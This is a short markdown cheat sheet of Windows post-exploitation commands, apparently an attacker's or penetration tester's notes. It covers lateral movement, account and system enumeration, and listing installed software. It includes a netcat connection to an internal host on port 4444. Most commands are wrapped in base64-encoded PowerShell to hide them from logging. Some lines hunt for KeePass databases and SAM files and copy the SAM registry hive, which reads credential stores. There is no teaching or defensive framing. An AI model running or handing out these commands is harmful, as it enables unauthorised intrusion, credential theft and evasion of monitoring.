## Lateral Movement:

- `nc 192.168.50.220 4444`

## Local Account Enumeration:

- `$command = "whoami"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "whoami /groups"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-LocalUser"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-LocalGroup"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-LocalGroupMember Administrators"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-LocalGroupMember Administrators | Where-Object { $_.PrincipalSource -eq 'Local' } | Select-Object Name"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$folderPath = ".\Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-LocalGroupMember Administrators | Where-Object { $_.PrincipalSource -eq "Local" } | Select-Object Name'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Campaign\output.txt"`

- `Get-LocalUser -Name "username" | Select-Object *`

- `Get-LocalGroupMember Administrators | Where-Object { $_.PrincipalSource -eq 'Local' } | Select-Object Name`

## Get Installed Applications:

### 32 Bit:

- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

### 64 Bit:

- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

## Local System Enumeration

- `$command = "Get-Process"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-ChildItem -Path C:\ -Include \*.kdbx -File -Recurse -ErrorAction SilentlyContinue"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-ChildItem -Path C:\ -Include SAM -File -Recurse -ErrorAction SilentlyContinue"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-ChildItem -Path C:\ -Include _.txt,_.ini -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'YourSearchString'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Copy-Item -Path "$env:SystemRoot\System32\Config\RegBack\SAM" -Destination 'C:\Path\To\NewLocation\SAM'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "systeminfo"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "ipconfig /all"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "route print"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "netstat -ano"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
